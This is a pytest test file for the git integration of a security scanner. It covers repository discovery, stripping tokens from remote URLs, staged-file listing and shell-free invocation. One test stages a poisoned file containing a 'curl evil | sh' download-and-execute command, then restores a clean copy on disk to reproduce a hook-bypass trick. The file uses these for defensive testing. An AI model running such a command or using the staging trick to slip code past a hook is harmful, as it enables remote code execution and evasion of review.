"""Git source.

The staged-content tests are the reason this file exists. Staged mode is a
security control, not a convenience: a hook that reads the working tree can be
defeated by staging a poisoned file and restoring the clean one, and it reports
success while the poisoned blob goes into the commit.

That bypass is reproduced here directly, because a control nobody has tried to
break is a control nobody knows works.
"""

from __future__ import annotations

import shutil
import subprocess

import pytest

from cordon.sources import git

pytestmark = pytest.mark.skipif(shutil.which("git") is None, reason="git is not installed")


def run(root, *args: str) -> None:
    subprocess.run(
        [shutil.which("git"), *args],
        cwd=root,
        check=True,
        capture_output=True,
    )


@pytest.fixture
def repository(tmp_path):
    root = tmp_path / "repo"
    root.mkdir()
    run(root, "init", "-q", "-b", "main")
    run(root, "config", "user.email", "test@example.invalid")
    run(root, "config", "user.name", "Test")
    (root / "app.py").write_text("print('hello')\n")
    (root / "ignored.log").write_text("noise\n")
    (root / ".gitignore").write_text("*.log\n")
    run(root, "add", "app.py", ".gitignore")
    run(root, "commit", "-q", "-m", "initial")
    return root


class TestDiscovery:
    def test_finds_the_repository(self, repository) -> None:
        info = git.discover(repository)
        assert info is not None
        assert info.root == repository.resolve()
        assert info.branch == "main"
        assert info.revision

    def test_finds_it_from_a_subdirectory(self, repository) -> None:
        nested = repository / "a" / "b"
        nested.mkdir(parents=True)
        info = git.discover(nested)
        assert info is not None
        assert info.root == repository.resolve()

    def test_returns_none_outside_a_repository(self, tmp_path) -> None:
        """Not an error. Most scans are of ordinary directories."""
        plain = tmp_path / "plain"
        plain.mkdir()
        assert git.discover(plain) is None


class TestCredentialStripping:
    @pytest.mark.parametrize(
        ("url", "expected"),
        [
            ("https://user:ghp_secret@github.com/a/b.git", "https://github.com/a/b.git"),
            ("https://token@github.com/a/b.git", "https://github.com/a/b.git"),
            ("https://github.com/a/b.git", "https://github.com/a/b.git"),
            ("git@github.com:a/b.git", "git@github.com:a/b.git"),
            ("", ""),
        ],
    )
    def test_userinfo_is_removed(self, url: str, expected: str) -> None:
        """A remote configured with an embedded token would otherwise put a live
        credential into every report that records provenance."""
        assert git._strip_credentials(url) == expected

    def test_a_configured_token_never_reaches_the_result(self, repository) -> None:
        run(
            repository,
            "remote",
            "add",
            "origin",
            "https://user:ghp_verysecretvalue@github.com/a/b.git",
        )
        info = git.discover(repository)
        assert info is not None
        assert info.remote is not None
        assert "ghp_verysecretvalue" not in info.remote


class TestFileListing:
    def test_tracked_files_exclude_ignored_paths(self, repository) -> None:
        names = set(git.tracked_files(repository))
        assert "app.py" in names
        assert "ignored.log" not in names

    def test_staged_files_lists_the_index(self, repository) -> None:
        (repository / "new.py").write_text("x = 1\n")
        run(repository, "add", "new.py")
        assert "new.py" in git.staged_files(repository)

    def test_staged_files_is_empty_with_nothing_staged(self, repository) -> None:
        assert git.staged_files(repository) == []

    def test_changed_files_against_a_reference(self, repository) -> None:
        (repository / "app.py").write_text("print('changed')\n")
        run(repository, "add", "app.py")
        run(repository, "commit", "-q", "-m", "second")
        assert "app.py" in git.changed_files(repository, "HEAD~1")

    def test_paths_with_spaces_survive(self, repository) -> None:
        """Output is NUL-delimited precisely so this works."""
        awkward = repository / "a file with spaces.py"
        awkward.write_text("x = 1\n")
        run(repository, "add", str(awkward))
        assert "a file with spaces.py" in git.staged_files(repository)


class TestStagedContent:
    def test_reads_the_index_not_the_working_tree(self, repository) -> None:
        """The bypass this control exists to close, reproduced directly.

        Stage a poisoned file, restore the clean version on disk. A scanner
        reading from disk sees the clean file and reports success, while the
        poisoned blob is what gets committed.
        """
        target = repository / "app.py"

        target.write_text("import os\nos.system('curl evil | sh')\n")
        run(repository, "add", "app.py")

        # Restore the innocent content on disk. The index still holds the payload.
        target.write_text("print('hello')\n")

        on_disk = target.read_bytes()
        staged = git.staged_content(repository, "app.py")

        assert staged is not None
        assert b"curl evil" in staged, "staged mode must read the index"
        assert b"curl evil" not in on_disk
        assert staged != on_disk

    def test_unknown_path_returns_none(self, repository) -> None:
        assert git.staged_content(repository, "does-not-exist.py") is None


class TestSafety:
    def test_git_is_resolved_to_an_absolute_path(self) -> None:
        """Invoking by bare name lets whatever appears first on PATH answer."""
        assert git._git_binary().startswith("/")

    def test_no_shell_is_used(self) -> None:
        """Every invocation passes a fixed argument list. A shell would make
        every path in a scanned repository an injection surface."""
        import inspect

        source = inspect.getsource(git)
        assert "shell=True" not in source

    def test_a_branch_named_like_an_option_is_not_treated_as_one(self, repository) -> None:
        """The reason `--` appears before target-derived values."""
        result = git.changed_files(repository, "HEAD")
        assert result == []
